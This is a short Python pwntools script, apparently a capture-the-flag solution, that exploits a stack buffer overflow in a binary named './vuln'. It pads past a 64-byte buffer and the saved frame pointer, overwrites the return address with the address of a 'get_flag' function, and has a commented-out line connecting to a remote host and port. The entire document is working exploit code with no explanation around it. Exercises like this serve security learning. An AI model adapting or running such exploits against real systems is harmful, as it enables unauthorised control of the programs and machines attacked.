from pwn import *

binary = './vuln'

e = ELF(binary)

context.binary = binary
context.log_level = 'debug'

get_flag_address = e.symbols['get_flag']

def exploit():
    # p = remote('31.220.82.212', 5110)
    p=process('./vuln')

    padding = b'A' * 64  # buffer 크기 (64 bytes)
    padding += b'B' * 8  # saved EBP (8 bytes)

    payload = padding + p64(get_flag_address)

    p.recvuntil(b": ")
    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    exploit()